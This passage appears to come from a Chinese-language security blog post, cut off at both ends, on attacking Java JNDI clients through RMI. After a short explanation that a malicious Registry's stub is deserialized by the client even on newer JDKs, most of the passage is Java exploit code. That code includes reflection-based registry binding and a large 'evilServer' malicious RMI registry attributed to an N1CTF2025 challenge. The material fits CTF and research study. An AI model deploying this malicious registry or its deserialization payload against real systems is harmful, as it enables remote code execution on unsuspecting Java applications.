class="operator">=</span> (RMIServerSocketFactory) Proxy.newProxyInstance(</span><br><span class="line">                handler.getClass().getClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;RMIServerSocketFactory.class, Remote.class&#125;,</span><br><span class="line">                handler</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        Constructor&lt;UnicastRemoteObject&gt; constructor = UnicastRemoteObject.class.getDeclaredConstructor();</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">UnicastRemoteObject</span> <span class="variable">unicastRemoteObject</span> <span class="operator">=</span> constructor.newInstance();</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field_ssf</span> <span class="operator">=</span> UnicastRemoteObject.class.getDeclaredField(<span class="string">&quot;ssf&quot;</span>);</span><br><span class="line">        field_ssf.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field_ssf.set(unicastRemoteObject, factory);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> unicastRemoteObject;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">bindReflection</span><span class="params">(String name, Object obj, Registry registry)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">ref_filed</span> <span class="operator">=</span> RemoteObject.class.getDeclaredField(<span class="string">&quot;ref&quot;</span>);</span><br><span class="line">        ref_filed.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> (UnicastRef) ref_filed.get(registry);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">operations_filed</span> <span class="operator">=</span> RegistryImpl_Stub.class.getDeclaredField(<span class="string">&quot;operations&quot;</span>);</span><br><span class="line">        operations_filed.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Operation[] operations = (Operation[]) operations_filed.get(registry);</span><br><span class="line"></span><br><span class="line">        <span class="type">RemoteCall</span> <span class="variable">remoteCall</span> <span class="operator">=</span> ref.newCall((RemoteObject) registry, operations, <span class="number">0</span>, <span class="number">4905912898345647071L</span>);</span><br><span class="line">        <span class="type">ObjectOutput</span> <span class="variable">outputStream</span> <span class="operator">=</span> remoteCall.getOutputStream();</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">enableReplace_filed</span> <span class="operator">=</span> ObjectOutputStream.class.getDeclaredField(<span class="string">&quot;enableReplace&quot;</span>);</span><br><span class="line">        enableReplace_filed.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        enableReplace_filed.setBoolean(outputStream, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">        outputStream.writeObject(name);</span><br><span class="line">        outputStream.writeObject(obj);</span><br><span class="line"></span><br><span class="line">        ref.invoke(remoteCall);</span><br><span class="line">        ref.done(remoteCall);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="远程codebase失效"><a href="#远程codebase失效" class="headerlink" title="远程codebase失效"></a>远程codebase失效</h2><p>这个是jndi里的修复。&gt;8u121, &gt;8u191时，rmi和ldap分别无法从远程地址加载恶意工厂类。这个是老生常谈了，就不展开说。</p>
+<h1 id="jndi打client"><a href="#jndi打client" class="headerlink" title="jndi打client"></a>jndi打client</h1><p>在实际中，我们往往是发现一个可控的InitialContext.lookup点，也就是client的lookup可控。这个时候，就需要我们想办法去打client，下面就梳理一下打法。</p>
+<h2 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h2><h3 id="Registry返回恶意stub"><a href="#Registry返回恶意stub" class="headerlink" title="Registry返回恶意stub"></a>Registry返回恶意stub</h3><p>registry返回的stub会直接被client反序列化，所以可以构造恶意stub来实现攻击。</p>
+<p>我们知道，在高版本jdk中，如jdk17.0.16，默认不允许ldap反序列化数据：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1762691265682-8a8e015f-e067-4e7f-8c32-90f689989c3e.png"  alt="img"></p>
+<p>但是registry返回的stub却仍然直接调用readObject：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1762691326503-c96f00ef-2d30-4ff6-8a70-aa3a35ed04f6.png"  alt="img"></p>
+<p>所以可以通过RMI进行原生反序列化，这是一种在高版本jdk常用的绕过。</p>
+<p>恶意RMI，即恶意Registry可以通过java-chains起：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1762691395965-0c9bd035-4994-4060-a952-2344f7e097f8.png"  alt="img"></p>
+<p>那如果想用自己的链子，就要自己实现Registry。N1CTF2025的n1cat给出了实现：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.DataInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.DataOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectStreamClass;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.InetSocketAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.ServerSocket;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"><span class="keyword">import</span> java.net.SocketException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"><span class="keyword">import</span> java.rmi.MarshalException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UID;</span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> org.slf4j.Logger;</span><br><span class="line"><span class="keyword">import</span> org.slf4j.LoggerFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">evilServer</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//before you start it, you should set vm options:&quot;--add-opens=java.base/sun.nio.ch=ALL-UNNAMED --add-opens=java.base/java.lang=ALL-UNNAMED --add-opens=java.base/java.io=ALL-UNNAMED --add-opens=jdk.unsupported/sun.misc=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.base/java.lang.reflect=ALL-UNNAMED&quot;</span></span><br><span class="line">        evilServer.start();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">log</span> <span class="operator">=</span> LoggerFactory.getLogger(evilServer.class);</span><br><span class="line">    <span class="keyword">public</span> String ip;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> port;</span><br><span class="line">    <span class="keyword">private</span> ServerSocket ss;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">waitLock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> exit;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> hadConnection;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> evilServer serverInstance;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">evilServer</span><span class="params">(String ip, <span class="type">int</span> port)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.ip = ip;</span><br><span class="line">            <span class="built_in">this</span>.port = port;</span><br><span class="line">            <span class="built_in">this</span>.ss = ServerSocketFactory.getDefault().createServerSocket(<span class="built_in">this</span>.port);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> &#123;</span><br><span class="line">        serverInstance = <span class="keyword">new</span> <span class="title class_">evilServer</span>(<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">8899</span>);</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">serverThread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(serverInstance);</span><br><span class="line">        serverThread.start();</span><br><span class="line">        log.warn(<span class="string">&quot;[RMI Server] is already running.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">stop</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (serverInstance != <span class="literal">null</span>) &#123;</span><br><span class="line">            serverInstance.exit = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                serverInstance.ss.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            serverInstance = <span class="literal">null</span>;</span><br><span class="line">            log.info(<span class="string">&quot;[RMI Server] stopped.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">waitFor</span><span class="params">(<span class="type">int</span> i)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.hadConnection) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                log.info(<span class="string">&quot;[RMI Server] Waiting for connection&quot;</span>);</span><br><span class="line">                <span class="keyword">synchronized</span>(<span class="built_in">this</span>.waitLock) &#123;</span><br><span class="line">                    <span class="built_in">this</span>.waitLock.wait((<span class="type">long</span>)i);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">this</span>.hadConnection;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException var5) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.exit = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.ss.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var4) &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">synchronized</span>(<span class="built_in">this</span>.waitLock) &#123;</span><br><span class="line">            <span class="built_in">this</span>.waitLock.notify();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        log.info(<span class="string">&quot;[RMI Server] Listening on &#123;&#125;:&#123;&#125;&quot;</span>, <span class="string">&quot;127.0.0.1&quot;</span>, <span class="string">&quot;8899&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Socket</span> <span class="variable">s</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">while</span>(!<span class="built_in">this</span>.exit &amp;&amp; (s = <span class="built_in">this</span>.ss.accept()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        s.setSoTimeout(<span class="number">5000</span>);</span><br><span class="line">                        <span class="type">InetSocketAddress</span> <span class="variable">remote</span> <span class="operator">=</span> (InetSocketAddress)s.getRemoteSocketAddress();</span><br><span class="line">                        log.info(<span class="string">&quot;[RMI Server] Have connection from &quot;</span> + remote);</span><br><span class="line">                        <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> s.getInputStream();</span><br><span class="line">                        <span class="type">InputStream</span> <span class="variable">bufIn</span> <span class="operator">=</span> (InputStream)(is.markSupported() ? is : <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(is));</span><br><span class="line">                        bufIn.mark(<span class="number">4</span>);</span><br><span class="line">                        <span class="type">DataInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(bufIn);</span><br><span class="line">                        <span class="type">Throwable</span> <span class="variable">var6</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            <span class="type">int</span> <span class="variable">magic</span> <span class="operator">=</span> in.readInt();</span><br><span class="line">                            <span class="type">short</span> <span class="variable">version</span> <span class="operator">=</span> in.readShort();</span><br><span class="line">                            <span class="keyword">if</span> (magic == <span class="number">1246907721</span> &amp;&amp; version == <span class="number">2</span>) &#123;</span><br><span class="line">                                <span class="type">OutputStream</span> <span class="variable">sockOut</span> <span class="operator">=</span> s.getOutputStream();</span><br><span class="line">                                <span class="type">BufferedOutputStream</span> <span class="variable">bufOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedOutputStream</span>(sockOut);</span><br><span class="line">                                <span class="type">DataOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataOutputStream</span>(bufOut);</span><br><span class="line">                                <span class="type">Throwable</span> <span class="variable">var12</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">                                <span class="keyword">try</span> &#123;</span><br><span class="line">                                    <span class="type">byte</span> <span class="variable">protocol</span> <span class="operator">=</span> in.readByte();</span><br><span class="line">                                    <span class="keyword">switch</span> (protocol) &#123;</span><br><span class="line">                                        <span class="keyword">case</span> <span class="number">75</span>:</span><br><span class="line">                                            out.writeByte(<span class="number">78</span>);</span><br><span class="line">                                            <span class="keyword">if</span> (remote.getHostName() != <span class="literal">null</span>) &#123;</span><br><span class="line">                                                out.writeUTF(remote.getHostName());</span><br><span class="line">                                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                                out.writeUTF(remote.getAddress().toString());</span><br><span class="line">                                            &#125;</span><br><span class="line"></span><br><span class="line">                                            out.writeInt(remote.getPort());</span><br><span class="line">                                            out.flush();</span><br><span class="line">                                            in.readUTF();</span><br><span class="line">                                            in.readInt();</span><br><span class="line">                                        <span class="keyword">case</span> <span class="number">76</span>:</span><br><span class="line">                                            <span class="built_in">this</span>.doMessage(s, in, out);</span><br><span class="line">                                            bufOut.flush();</span><br><span class="line">                                            out.flush();</span><br><span class="line">                                            <span class="keyword">break</span>;</span><br><span class="line">                                        <span class="keyword">case</span> <span class="number">77</span>:</span><br><span class="line">                                        <span class="keyword">default</span>:</span><br><span class="line">                                            log.info(<span class="string">&quot;[RMI Server] Unsupported protocol&quot;</span>);</span><br><span class="line">                                            s.close();</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125; <span class="keyword">catch</span> (Throwable var88) &#123;</span><br><span class="line">                                    var12 = var88;</span><br><span class="line">                                    <span class="keyword">throw</span> var88;</span><br><span class="line">                                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                                    <span class="keyword">if</span> (out != <span class="literal">null</span>) &#123;</span><br><span class="line">                                        <span class="keyword">if</span> (var12 != <span class="literal">null</span>) &#123;</span><br><span class="line">                                            <span class="keyword">try</span> &#123;</span><br><span class="line">                                                out.close();</span><br><span class="line">                                            &#125; <span class="keyword">catch</span> (Throwable var87) &#123;</span><br><span class="line">                                                var12.addSuppressed(var87);</span><br><span class="line">                                            &#125;</span><br><span class="line">                                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                            out.close();</span><br><span class="line">                                        &#125;</span><br><span class="line">                                    &#125;</span><br><span class="line"></span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                s.close();</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (Throwable var90) &#123;</span><br><span class="line">                            var6 = var90;</span><br><span class="line">                            <span class="keyword">throw</span> var90;</span><br><span class="line">                        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                            <span class="keyword">if</span> (in != <span class="literal">null</span>) &#123;</span><br><span class="line">                                <span class="keyword">if</span> (var6 != <span class="literal">null</span>) &#123;</span><br><span class="line">                                    <span class="keyword">try</span> &#123;</span><br><span class="line">                                        in.close();</span><br><span class="line">                                    &#125; <span class="keyword">catch</span> (Throwable var86) &#123;</span><br><span class="line">                                        var6.addSuppressed(var86);</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                    in.close();</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InterruptedException var92) &#123;</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                        e.printStackTrace(System.err);</span><br><span class="line">                    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                        log.info(<span class="string">&quot;[RMI Server] Closing connection&quot;</span>);</span><br><span class="line">                        s.close();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (s != <span class="literal">null</span>) &#123;</span><br><span class="line">                    s.close();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.ss != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="built_in">this</span>.ss.close();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SocketException var96) &#123;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace(System.err);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">doMessage</span><span class="params">(Socket s, DataInputStream in, DataOutputStream out)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        log.info(<span class="string">&quot;[RMI Server] Reading message...&quot;</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">op</span> <span class="operator">=</span> in.read();</span><br><span class="line">        <span class="keyword">switch</span> (op) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">80</span>:</span><br><span class="line">                <span class="built_in">this</span>.doCall(s, in, out);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">81</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="number">83</span>:</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;unknown transport op &quot;</span> + op);</span><br><span class="line">            <span class="keyword">case</span> <span class="number">82</span>:</span><br><span class="line">                out.writeByte(<span class="number">83</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">84</span>:</span><br><span class="line">                UID.read(in);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        s.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">doCall</span><span class="params">(Socket s, DataInputStream in, DataOutputStream out)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(in) &#123;</span><br><span class="line">            <span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="string">&quot;[Ljava.rmi.server.ObjID;&quot;</span>.equals(desc.getName())) &#123;</span><br><span class="line">                    <span class="keyword">return</span> ObjID[].class;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;java.rmi.server.ObjID&quot;</span>.equals(desc.getName())) &#123;</span><br><span class="line">                    <span class="keyword">return</span> ObjID.class;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;java.rmi.server.UID&quot;</span>.equals(desc.getName())) &#123;</span><br><span class="line">                    <span class="keyword">return</span> UID.class;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;java.lang.String&quot;</span>.equals(desc.getName())) &#123;</span><br><span class="line">                    <span class="keyword">return</span> 